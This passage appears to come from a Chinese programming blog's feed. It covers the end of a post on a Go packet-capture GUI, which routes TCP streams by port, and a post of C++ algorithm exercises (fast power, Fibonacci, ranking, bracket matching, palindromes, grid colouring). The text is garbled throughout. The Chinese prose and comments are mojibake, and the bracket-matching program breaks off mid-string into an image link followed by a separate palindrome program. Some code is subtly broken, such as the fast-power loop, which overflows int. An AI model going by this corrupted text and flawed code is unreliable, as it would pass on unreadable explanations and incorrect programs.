class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *httpStreamFactory)</span></span> New(net, transport gopacket.Flow) tcpassembly.Stream &#123;</span><br><span class="line">    hstream := &amp;httpStream&#123;</span><br><span class="line">       net:       net,</span><br><span class="line">       transport: transport,</span><br><span class="line">       r:         tcpreader.NewReaderStream(),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    src, dst := transport.Endpoints()</span><br><span class="line">    <span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, src) == <span class="string">&quot;80&quot;</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.runResponse() <span class="comment">// å¤„ç†å“åº”</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, dst) == <span class="string">&quot;80&quot;</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.runRequest() <span class="comment">// å¤„ç†è¯·æ±‚</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> fmt.Sprintf(<span class="string">&quot;%v&quot;</span>, dst) == <span class="string">&quot;443&quot;</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.runRequests() <span class="comment">// å¤„ç†HTTPSè¯·æ±‚</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       <span class="keyword">go</span> hstream.run() <span class="comment">// å¤„ç†å…¶ä»–æµé‡</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//fmt.Println(pkgData)</span></span><br><span class="line">    <span class="keyword">return</span> &amp;hstream.r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h3><p>é¦–å…ˆï¼Œmain.goè¿›è¡Œäº†å­—ä½“åˆå§‹åŒ–ï¼Œå¹¶è°ƒç”¨äº†åº”ç”¨ç¨‹åºçš„ä¸»ç¨‹åºè¿›è¡Œé˜»å¡å“åº”ã€‚</p><p>åœ¨Run()å¯¹Fyneçª—å£è¿›è¡Œäº†ä¸€ç³»åˆ—è®¾ç½®ã€‚å¯ä»¥å…ˆå¿½ç•¥å¸¦HTTPå‡½æ•°çš„å†…å®¹ï¼Œå› ä¸ºåŸºæœ¬éƒ½æ˜¯å‡½æ•°å¤ç”¨ã€‚</p><p>LoadMenusåŠ è½½èœå•ï¼ŒLoadLayers()ä¸ºç‚¹å‡»æ•°æ®åŒ…çš„å¦‚ä¸‹å†…å®¹ï¼Œå¯¹LayersDataæ•°æ®åšå±•ç¤ºï¼Œ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170807012.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170807012.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>PkgInfoä¸ºç‚¹å‡»æ•°æ®åŒ…çš„å¦‚ä¸‹å†…å®¹ï¼Œä½¿ç”¨NewTableè¿›è¡Œå±•ç¤ºã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170940397.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240506170940397.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>Monitorä¸ºå³ä¸‹è§’çš„ç½‘å¡ä¿¡æ¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ‚ä¸ƒæ‚å…« </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ç®—æ³•ç»ƒä¹ </title>
      <link href="/2024/03/01/kao-yan-c-suan-fa-lian-xi/"/>
      <url>/2024/03/01/kao-yan-c-suan-fa-lian-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®—æ³•ç»ƒä¹ ï¼ˆC-ä»£ç ï¼‰"><a href="#ç®—æ³•ç»ƒä¹ ï¼ˆC-ä»£ç ï¼‰" class="headerlink" title="ç®—æ³•ç»ƒä¹ ï¼ˆC++ä»£ç ï¼‰"></a>ç®—æ³•ç»ƒä¹ ï¼ˆC++ä»£ç ï¼‰</h2><h3 id="å¿«é€Ÿå¹‚ç®—æ³•"><a href="#å¿«é€Ÿå¹‚ç®—æ³•" class="headerlink" title="å¿«é€Ÿå¹‚ç®—æ³•"></a>å¿«é€Ÿå¹‚ç®—æ³•</h3><p>é¢˜ç›®ï¼šè¾“å…¥ä¸€ä¸ªæ•´æ•° n ï¼Œæ±‚ n^n çš„<strong>ä¸ªä½æ•°</strong>æ˜¯å¤šå°‘ã€‚</p><blockquote><p>å¿«é€Ÿå¹‚ç®—æ³•ï¼šæŒ‡æ•°ä¸ºå¶æ•°ï¼Œåˆ™åº•æ•°å¹³æ–¹ï¼ŒæŒ‡æ•°é™¤äºŒï¼›æŒ‡æ•°ä¸ºå¥‡æ•°ï¼Œåˆ™æŒ‡æ•°å‡ä¸€å†æŠŠç»“æœä¹˜åº•æ•°ï¼Œåº•æ•°å¹³æ–¹ï¼ŒæŒ‡æ•°é™¤äºŒã€‚æŒ‡æ•°çœ‹ä½œäºŒè¿›åˆ¶ï¼Œé™¤äºŒå¯ä»¥çœ‹ä½œä½è¿ç®—ã€‚</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> power=n;</span><br><span class="line"><span class="type">int</span> base=n;</span><br><span class="line"><span class="type">int</span> result = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(power&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(power%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">result *= base;</span><br><span class="line">power /= <span class="number">2</span>;</span><br><span class="line">base *= base;<span class="comment">//æŒ‡æ•°ä¸ºå¥‡æ•°ï¼Œå…ˆä¹˜åº•æ•°ã€‚é™¤äºŒå°æ•°éƒ¨åˆ†èˆå»ã€‚åº•æ•°å¹³æ–¹ </span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">power /= <span class="number">2</span>;</span><br><span class="line">base *= base;<span class="comment">//æŒ‡æ•°ä¸ºå¶æ•°ï¼Œé™¤äºŒï¼Œåº•æ•°å¹³æ–¹ </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;result&lt;&lt;endl; </span><br><span class="line">cout&lt;&lt;result%<span class="number">10</span>;<span class="comment">//mod 10å³ä¸ªä½æ•°</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105155142.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240301105155142.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æ–æ³¢é‚£å¥‘"><a href="#æ–æ³¢é‚£å¥‘" class="headerlink" title="æ–æ³¢é‚£å¥‘"></a>æ–æ³¢é‚£å¥‘</h3><p>è¾“å…¥ä¸€ä¸ªæ•´æ•° n ï¼Œæ±‚æ–æ³¢é‚£å¥‘æ•°åˆ—çš„ç¬¬ n é¡¹ã€‚ç¬¬ä¸€é¡¹æ˜¯1ï¼Œ ç¬¬äºŒé¡¹æ˜¯1ã€‚<strong>è¦æ±‚å¿…é¡»é€’å½’ï¼</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>||n==<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">f</span>(n<span class="number">-2</span>)+<span class="built_in">f</span>(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    cout&lt;&lt;<span class="built_in">f</span>(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆç»©æ’å"><a href="#æˆç»©æ’å" class="headerlink" title="æˆç»©æ’å"></a>æˆç»©æ’å</h3><p>å¯¹ n ä¸ªåŒå­¦çš„è€ƒè¯•æˆç»©ä»å¤§åˆ°å°æ’åï¼Œæˆç»©ç›¸åŒçš„ç®—åŒä¸€åã€‚æ±‚æ’åä¸º m çš„æˆç»©ã€‚è‹¥æ— æ’åä¸ºmçš„æˆç»©ï¼Œè¾“å‡ºæœ€åä¸€åçš„æˆç»©ã€‚</p><ul><li>è¾“å…¥æ ¼å¼</li></ul><p>ä¸€å…±ä¸‰è¡Œ</p><p>ç¬¬ä¸€è¡Œï¼šä¸€ä¸ªæ•´æ•° nï¼Œè¡¨ç¤ºåŒå­¦çš„ä¸ªæ•°ã€‚</p><p>ç¬¬äºŒè¡Œï¼šn ä¸ªæ•´æ•°ï¼Œè¡¨ç¤º n ä¸ªåŒå­¦çš„æˆç»©ã€‚</p><p>ç¬¬ä¸‰è¡Œï¼šä¸€ä¸ªæ•´æ•° mï¼Œè¡¨ç¤ºæ’åã€‚</p><ul><li>è¾“å‡ºæ ¼å¼</li></ul><p>ä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ’åä¸º m çš„æˆç»©ã€‚</p><ul><li>è¾“å…¥æ ·ä¾‹</li></ul><p>6<br> 100 100 99 98 97</p><p>2</p><ul><li>è¾“å‡ºæ ·ä¾‹</li></ul><p>99</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;è¾“å…¥åŒå­¦ä¸ªæ•°ï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="type">int</span> score[n];</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;è¾“å…¥åŒå­¦çš„æˆç»©ï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">cin&gt;&gt;score[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//cout&lt;&lt;&quot;1&quot;;</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=n-i<span class="number">-1</span>;j&gt;<span class="number">0</span>;j--)&#123;</span><br><span class="line"><span class="keyword">if</span>(score[j]&gt;score[j<span class="number">-1</span>])&#123;</span><br><span class="line"><span class="type">int</span> temp = score[j];</span><br><span class="line">score[j] = score[j<span class="number">-1</span>];</span><br><span class="line">score[j<span class="number">-1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//å†’æ³¡æ’åº</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>,j;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(score[j]!=score[i])&#123;</span><br><span class="line">score[++i]=score[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="comment">//åŒæŒ‡é’ˆå»é‡</span></span><br><span class="line">cout&lt;&lt;<span class="string">&quot;è¾“å…¥è¦æŸ¥è¯¢çš„æ’åï¼š&quot;</span>&lt;&lt;endl;</span><br><span class="line">cin&gt;&gt;m;</span><br><span class="line"><span class="keyword">if</span>(m&gt;i+<span class="number">1</span>)&#123;</span><br><span class="line">cout&lt;&lt;score[i]&lt;&lt;endl; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;score[m<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¬å·åŒ¹é…"><a href="#æ‹¬å·åŒ¹é…" class="headerlink" title="æ‹¬å·åŒ¹é…"></a>æ‹¬å·åŒ¹é…</h3><p>ç»™å®šä¸‰ç§æ‹¬å·{ }ï¼Œ[ ], ( )ï¼Œå’Œè‹¥å¹²å°å†™å­—æ¯çš„å­—ç¬¦ä¸²ï¼Œè¯·é—®æ”¹å­—ç¬¦ä¸²çš„æ‹¬å·æ˜¯å¦åŒ¹é…ï¼ˆå¯ä»¥åµŒå¥—ï¼‰?</p><ul><li>è¾“å…¥è¾“å‡º</li></ul><p>è¾“å…¥æ ¼å¼ï¼šå­—ç¬¦ä¸²sã€‚ è¾“å‡ºæ ¼å¼ï¼šè‹¥åŒ¹é…ï¼Œè¾“å‡ºyesï¼Œå¦åˆ™è¾“å‡ºnoã€‚</p><ul><li>è¾“å…¥æ ·ä¾‹</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;[a(v)d]q&#125;</span><br></pre></td></tr></table></figure><ul><li>è¾“å‡ºæ ·ä¾‹</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yes</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">stack &lt;<span class="type">int</span>&gt; s;</span><br><span class="line">string strs;</span><br><span class="line">cin&gt;&gt;strs;</span><br><span class="line"><span class="type">int</span> m = strs.<span class="built_in">length</span>();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(strs[i]==<span class="string">&#x27;(&#x27;</span>||strs[i]==<span class="string">&#x27;&#123;&#x27;</span>||strs[i]==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">s.<span class="built_in">push</span>(strs[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strs[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!s.<span class="built_in">empty</span>()&amp;&amp;s.<span class="built_in">top</span>()==<span class="string">&#x27;(&#x27;</span>) s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;ä¸åŒ¹é…&quot;</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(strs[i]==<span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!s.<span class="built_in">empty</span>()&amp;&amp;s.<span class="built_in">top</span>()==<span class="string">&#x27;&#123;&#x27;</span>) s.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;ä¸åŒ¹é…&quot;</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(strs[i]==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!s.<span class="built_in">empty</span>()&amp;&amp;s.<span class="built_in">top</span>()==<span class="string">&#x27;[](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154623876.png)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">```cpp</span></span><br><span class="line"><span class="string">//åˆ¤æ–­å›æ–‡ä¸²</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="string">#include &lt;string&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">using namespace std;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bool isCircel(string &amp;str)&#123;</span></span><br><span class="line"><span class="string">int m = str.length();</span></span><br><span class="line"><span class="string">for(int i=0;i&lt;m/2;i++)&#123;//ä¸­ç‚¹ç»“æŸ</span></span><br><span class="line"><span class="string">if(str[i]!=str[m-i-1]) return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">return 1;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">string str;</span></span><br><span class="line"><span class="string">getline(cin,str);</span></span><br><span class="line"><span class="string">if(isCircel(str)) cout&lt;&lt;&quot;yes&quot;;</span></span><br><span class="line"><span class="string">else cout&lt;&lt;&quot;No&quot;;</span></span><br><span class="line"><span class="string">return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154747079.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154747079.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154726168.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302154726168.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="æ ¼å­æ¶‚è‰²"><a href="#æ ¼å­æ¶‚è‰²" class="headerlink" title="æ ¼å­æ¶‚è‰²"></a>æ ¼å­æ¶‚è‰²</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302160745466.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302160745466.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿™é“é¢˜å…³é”®åœ¨nä¸ªæ ¼å­ï¼Œn-1æ ¼å­é‡Œä»€ä¹ˆé¢œè‰²ã€‚</p><ul><li>å‡è®¾n-1æ ¼å­é‡Œå’Œç¬¬ä¸€ä¸ªæ ¼å­é¢œè‰²ç›¸åŒï¼Œåˆ™ç¬¬nä¸ªæ ¼å­å¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼Œä¸”f(n-1)&#x3D;f(n-2)</li><li>å‡è®¾n-1æ ¼å­é‡Œå’Œç¬¬ä¸€ä¸ªæ ¼å­é¢œè‰²ä¸åŒï¼Œåˆ™ç¬¬nä¸ªæ ¼å­åªæœ‰ä¸€ç§é€‰æ‹©</li></ul><p>å³ç¬¬ä¸€ç§æƒ…å†µf(n)&#x3D;2*f(n-2)ï¼Œç¬¬äºŒç§æƒ…å†µf(n)&#x3D;f(n-1)</p><p>é€’æ¨å…¬å¼ï¼šf(n) &#x3D; 2*f(n-2) + f(n-1)</p><p>ä¸”ç”±äºn&#x3D;3æ—¶ï¼Œç¬¬ä¸‰æ ¼å¿…ä¸èƒ½å’Œå‰ä¸¤æ ¼é¢œè‰²ç›¸åŒï¼Œæ‰€ä»¥f(3)&#x3D;f(2)&#x3D;6</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ ¼å­æ¶‚è‰²</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">3</span>||n==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>*<span class="built_in">f</span>(n<span class="number">-2</span>) + <span class="built_in">f</span>(n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">cin &gt;&gt;n;</span><br><span class="line">cout&lt;&lt;<span class="built_in">f</span>(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302162327657.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302162327657.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="é€’å¢æœ€å¤§å­åºåˆ—å’Œ"><a href="#é€’å¢æœ€å¤§å­åºåˆ—å’Œ" class="headerlink" title="é€’å¢æœ€å¤§å­åºåˆ—å’Œ"></a>é€’å¢æœ€å¤§å­åºåˆ—å’Œ</h3><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302165646642.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240302165646642.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ€å¤§çš„å›°éš¾ï¼Œè¯»é¢˜ï¼šæ¯”å¦‚1 3 7 2 10çš„åºåˆ—ï¼Œè¦æ±‚æ‰¾å‡ºä¸€ä¸ªé€’å¢å­åºåˆ—ï¼Œä¹Ÿå°±æ˜¯1 3 7æ»¡è¶³ï¼Œ1 3 7 2ä¸æ»¡è¶³ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é€’å¢å­åºåˆ—æœ€å¤§å’Œ</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">f</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;m)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> maxsum=<span class="number">0</span>;<span class="type">int</span> n=m.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> temp=m[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(m[i]&gt;m[i<span class="number">-1</span>])&#123;<span class="comment">//åé¢ä¸€ä¸ªæ¯”å‰é¢çš„å¤§ï¼Œå³é€’å¢ï¼ŒåŠ åˆ°å½“å‰æœ€å¤§å’Œ</span></span><br><span class="line">temp += m[i];</span><br><span class="line"><span class="keyword">if</span>(temp &gt; maxsum)&#123;<span class="comment">//å½“å‰æœ€å¤§å’Œ&gt;æœ€å¤§å­åºåˆ—å’Œ</span></span><br><span class="line">maxsum = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span 